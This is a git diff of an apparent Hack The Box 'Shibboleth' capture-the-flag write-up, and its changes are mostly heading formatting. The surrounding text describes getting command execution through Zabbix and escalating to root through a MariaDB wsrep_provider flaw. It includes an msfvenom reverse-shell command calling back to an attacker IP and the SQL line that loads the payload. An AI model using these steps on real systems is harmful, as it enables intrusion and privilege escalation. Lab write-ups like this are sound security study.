@@ -6,7 +6,7 @@ tags: [hackthebox, htb, boot2root, writeup, write-up, linux, snmp, zabbix, comma
 image: "/assets/img/shibboleth/shibboleth_feature.png"
 ---
 ## RECON
-## Nmap
+### Nmap
 
 As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.
 
@@ -59,7 +59,7 @@ The response headers don’t give much info at all.
 But the footer provides some interesting information that we need to take note of
 
 
-#### Directory Brute Force
+### Directory Brute Force
 
 Trying directory Bruteforce using gobuster we get two directories.
 ```bash
@@ -122,14 +122,13 @@ We get:
 - `monitoring.shibboleth.htb`
 - `zabbix.shibboleth.htb`
 
-### Site
 I will add all three to the hosts file and visit the pages.
 
 All three `subdomains` redirect to the same login page
 
 ![zabbix login page](/assets/img/shibboleth/zabbix_login_page.png)
 
-### What is Zabbix you ask :)?
+##### What is Zabbix you ask :)?
 
 Zabbix is an open-source, real-time monitoring tool for servers, networks and virtual machines and cloud services, which can be configured by using XML based templates.
 
@@ -170,8 +169,8 @@ Now we have a valid username:password, we can try log in to Zabbix
 We get redirected to Zabbix dashboard, sweet!
 
 
-Shell as Zabbix
-Exploiting Zabbix
+## Shell as Zabbix
+#### Exploiting Zabbix
 I now have to find a way to execute commands on zabbix agents.
 
 Luckily i stumbled upon this Post .
@@ -180,10 +179,10 @@ We have to create a new item. Insert a command to spawn a reverse shell in the "
 
 We shall do this by initiating a ping command back to our box. (always a good move :) )
 
-Testing RCE
+### Testing RCE
 
 
-RCE confirmed
+### RCE confirmed
 
 
 About time we get our shell
@@ -192,7 +191,7 @@ About time we get our shell
 Finally we are on the box as Zabbix user
 
 
-User Flag
+### User Flag
 To obtain the user flag we need to operate as ipmi-svc user.
 
 zabbix@shibboleth:/$ cat /etc/passwd | grep bash
@@ -208,8 +207,8 @@ ipmi-svc
 Sure enough they did and we are ipmi-svc user. We can also read the user flag.
 
 
-Shell as root
-Enumeration
+## Shell as root
+#### Enumeration
 Running processes
 Checking at the running processes we can see there is mysql running.
 
@@ -220,7 +219,7 @@ Awesome! lets log in to the mysql service
 
 
 
-Exploiting MariaDB
+### Exploiting MariaDB
 Checking the MariaDB version online I find a Vulnerability.
 
 Let's Create a reverse shell binary with the using msfvenom and transfer the payload file to the target machine via wget as described in the PoC.
@@ -232,7 +231,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9003 -f elf-so -
 Now we spin up a netcat session and wait for a connection.
 
 
-Execute:
+#### Execute:
 
 SET GLOBAL wsrep_provider="/tmp/george.so";
 
